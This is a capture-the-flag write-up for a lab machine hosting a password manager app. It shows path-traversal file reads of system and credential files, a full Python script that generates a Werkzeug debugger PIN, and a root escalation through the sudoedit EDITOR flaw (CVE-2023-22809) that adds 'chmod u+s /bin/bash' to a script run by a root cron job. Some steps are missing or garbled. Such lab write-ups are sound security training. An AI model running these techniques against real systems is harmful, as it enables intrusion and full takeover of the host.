## Enumeration


- I began with a full TCP port scan, followed by a service and version detection scan on the discovered open ports

	```python
	nmap -p- --open -vvv --min-rate 3000 -Pn -sS 10.129.228.212 -oG scan
	/opt/extractports scan
	nmap -p22,80 -Pn -sCV 10.129.228.212 -oN ports
	```

  <img width="944" height="245" alt="image" src="https://github.com/user-attachments/assets/11ee3130-7ea2-4c90-8c13-af6ffacdc9b7" />

- The scan revealed ports 22 (SSH) and 80 (HTTP). The web server redirected to **superpass.htb**, which I added to `/etc/hosts`.
- Navigating to the site revealed **SuperPassword**, a password manager web application.

## Initial Access – LFI via Export Functionality

- After registering and logging in, I explored the vault functionality. The **Export** button triggers a download request with a `fn` parameter containing the filename.

	<img width="1624" height="488" alt="image" src="https://github.com/user-attachments/assets/875c41fb-c168-4b69-92b7-6376ec174aca" />

- By manipulating the `fn` parameter, I discovered an **Arbitrary File Read** vulnerability (LFI):

	```python
	http://superpass.htb/download?../etc/passwd
	```

- Reading `/etc/passwd` revealed the following system users of interest: **corum**, **edwards**, **dev_admin**, and **runner**.

- I also read the nginx configuration to understand the application structure, and identified the web root at `/app/app/superpass` from error messages triggered by invalid paths.

	```python
	http://superpass.htb/download?fn=../etc/nginx/nginx.conf
	```

## Werkzeug Debug Console – PIN Generation

- The application error pages exposed a **Werkzeug interactive debugger** protected by a PIN. I proceeded to generate this PIN by collecting the required system information via the LFI. [Help](https://b33pl0g1c.medium.com/hacking-the-debugging-pin-of-a-flask-application-7364794c4948).

- First, I retrieved the network interface list and MAC address:

	```python
	/proc/net/arp
	/sys/class/net/eth0/address
	```

- I also collected the following files to complete the PIN generation inputs:

	```python
	/proc/self/cgroup 
	/proc/self/environ 
	/app/config_prod.json
	```

- el `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` puede ser varios, dependera del modo en que se haya ejecutado la app

  <img width="573" height="508" alt="image" src="https://github.com/user-attachments/assets/986cc65e-d1df-4eb3-ad91-1dc1716f94d8" />

- With all the required data, I generated the debugger PIN using the following Python script:

	```python
	import hashlib
	from itertools import chain
	probably_public_bits = [
	    'www-data',  # username
	    'flask.app',  # modname
	    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
	    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # getattr(mod, '__file__', None),
	]
	
	private_bits = [
	    '345051814451',  # str(uuid.getnode()),  /sys/class/net/ens33/address
	    'ed5b159560f54721827644bc9b220d00superpass.service'  # get_machine_id(), /etc/machine-id
	]
	
	#h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
	h = hashlib.sha1()
	for bit in chain(probably_public_bits, private_bits):
	    if not bit:
	        continue
	    if isinstance(bit, str):
	        bit = bit.encode('utf-8')
	    h.update(bit)
	h.update(b'cookiesalt')
	#h.update(b'shittysalt')
	
	cookie_name = '__wzd' + h.hexdigest()[:20]
	
	num = None
	if num is None:
	    h.update(b'pinsalt')
	    num = ('%09d' % int(h.hexdigest(), 16))[:9]
	
	rv = None
	if rv is None:
	    for group_size in 5, 4, 3:
	        if len(num) % group_size == 0:
	            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
	                          for x in range(0, len(num), group_size))
	            break
	    else:
	        rv = num
	
	print(rv)
	```

- The generated PIN (e.g. **104-938-437**) changes each time the machine restarts. I entered it into the Werkzeug console to unlock the interactive Python shell.

	```python

	select * from passwords;
	```

## Privilege Escalation – CVE-2023-22809 (sudoedit)

- As `edwards`, I checked sudo permissions:

  ```python
  sudo -l
  ```

  <img width="1098" height="173" alt="image" src="https://github.com/user-attachments/assets/21a92336-1f0b-474a-b531-11208890401a" />


- The user could run `sudoedit` as **dev_admin** on two files: `/app/config_test.json` and `/app/app-testing/tests/functional/creds.txt`.
- Searching for files owned by the `dev_admin` group, I found that `/app/venv/bin/activate` was writable via the `dev_admin` group, and that a cron job executed as **root** sources this file periodically.
- I exploited **CVE-2023-22809** (Sudo < 1.9.12p2), which allows injecting extra file paths through the `EDITOR` environment variable to bypass the `sudoedit` file restriction:

  ```python
  export EDITOR="vim -- /app/venv/bin/activate" 
  sudo -u dev_admin sudoedit /app/config_test.json
  ```

- Inside the `activate` script (opened via vim), I appended the following line to set the SUID bit on `/bin/bash` when sourced by root:

  ```python
  chmod u+s /bin/bash
  ```

- After waiting for the cron to trigger, I confirmed the SUID bit was set and spawned a root shell:

	```python
	bash -p 
	whoami # root
	```

- I navigated to `/root` and retrieved the final flag.
